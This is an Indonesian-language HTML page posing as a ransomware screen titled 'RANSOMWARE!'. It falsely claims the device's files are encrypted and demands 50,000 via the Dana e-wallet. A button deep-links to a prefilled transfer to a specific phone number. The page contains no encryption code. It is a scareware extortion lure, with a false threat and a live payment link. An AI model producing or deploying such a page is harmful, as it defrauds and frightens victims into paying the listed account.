<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>thedark!</title>
<style>
  :root{
    --red:#ff0033;
    --bg:#000;
    --txt:#fff;
    --font:'Courier New',Courier,monospace;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;background:var(--bg);color:var(--txt);font-family:var(--font)}
  main{
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:1rem;
  }
  #box{
    width:100%;
    max-width:28rem; /* 448 px */
    text-align:center;
    border:2px solid var(--red);
    border-radius:.5rem;
    padding:clamp(1.5rem,4vw,2.5rem);
  }
  h1{
    color:var(--red);
    font-size:clamp(1.5rem,5vw,2.25rem);
    margin-bottom:.75em;
  }
  p{
    font-size:clamp(.875rem,2.5vw,1.125rem);
    margin:.25em 0;
  }
  button{
    margin-top:1.5rem;
    padding:.75rem 2rem;
    font-size:clamp(.875rem,2.5vw,1.125rem);
    background:var(--red);
    color:#fff;
    border:none;
    border-radius:.25rem;
    cursor:pointer;
    transition:opacity .2s;
  }
  button:hover{opacity:.8}
</style>
</head>

<body>
  <main>
    <div id="box">
      <h1>RANSOMWARE!</h1>
      <p>Semua file di perangkat ini telah <strong>dienkripsi</strong>.</p>
      <p>Untuk membukanya kembali,</p>
      <p>transfer </strong>50,000</strong></p> ke <strong>Dana: 085772449454</strong></p>
      <p>hp akan terbuka otomatis sesudah transfer.</p>

      <button onclick="openDana()">transferi</button>
    </div>
  </main>

<script>
function openDana() {
  // deep-link Dana dengan nomor & nominal otomatis
  window.location.href = "https://link.dana.id/transfer?phone=085772449454&amount=50000";
}
</script>
</body>
</html>
